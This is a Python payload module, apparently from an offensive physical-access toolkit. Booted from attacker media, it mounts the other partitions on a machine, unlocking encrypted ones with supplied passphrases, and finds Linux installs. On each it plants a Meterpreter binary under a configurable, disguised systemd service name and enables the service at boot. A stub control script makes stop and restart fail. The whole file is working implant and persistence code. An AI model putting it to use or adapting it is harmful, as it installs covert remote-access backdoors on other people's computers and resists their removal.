#!/usr/bin/python3
"""
Meterpreter payload
"""
from snr.core.payload import context, entry_point, storage
from snr.core.util import common_utils
from snr.core.util.payloads import systemd_service

LINUX_SERVICE_NAME = "@LINUX_SERVICE_NAME@"
LINUX_SERVICE_DESCRIPTION = "@LINUX_SERVICE_DESCRIPTION@"
PASSPHRASES = "@PASSPHRASES@"


@entry_point.entry_point
def main() -> None:
    block_info, _, our_device = storage.setup()
    common_utils.print_info("Meterpreter payload started")
    for part in storage.query_all_partitions(block_info):
        if storage.get_partition_root(part, block_info) == our_device:
            continue
        with storage.mount_partition(part, PASSPHRASES) as mounted_part:
            ctx = context.require_context_for_mount_point(
                mounted_part.mount_point)
            # Try to see if we are dealing with any sort of Linux
            if (mounted_part.exists("usr/sbin/init") or mounted_part.exists("usr/bin/init")) \
                    and mounted_part.exists("etc/shadow"):
                mounted_part.mkdir(f"usr/lib/libexec/{LINUX_SERVICE_NAME}/")
                mounted_part.copy(
                    "data/linux", f"usr/lib/libexec/{LINUX_SERVICE_NAME}/{LINUX_SERVICE_NAME}")
                with mounted_part.open(f"usr/lib/libexec/{LINUX_SERVICE_NAME}/control", "w",
                                       encoding="utf-8") as stream:
                    stream.write("#!/bin/bash\n")
                    stream.write("echo Action failed\n")
                    stream.write("exit 12\n")
                service = systemd_service.SystemdService(
                    ctx, LINUX_SERVICE_NAME)
                service.Unit_section["Description"] = LINUX_SERVICE_DESCRIPTION
                service.Unit_section["After"] = "network-online.target"
                service.Service_section[
                    "ExecStart"] = f"/usr/lib/libexec/{LINUX_SERVICE_NAME}/{LINUX_SERVICE_NAME}"
                service.Service_section["Type"] = "simple"
                service.Service_section[
                    "ExecRestart"] = f"usr/lib/libexec/{LINUX_SERVICE_NAME}/control restart"
                service.Service_section["ExecStop"] = f"usr/lib/libexec/{LINUX_SERVICE_NAME}/control stop"
                service.Install_section["WantedBy"] = "multi-user.target"
                service.write(False, False)
                mounted_part.link(f"/usr/lib/systemd/system/{LINUX_SERVICE_NAME}.service",
                                  f"/usr/lib/systemd/system/multi-user.target.wants/{LINUX_SERVICE_NAME}.service")
            else:
                common_utils.print_warning("Unknown operating system!")

    common_utils.print_ok("Meterpreter payload completed")
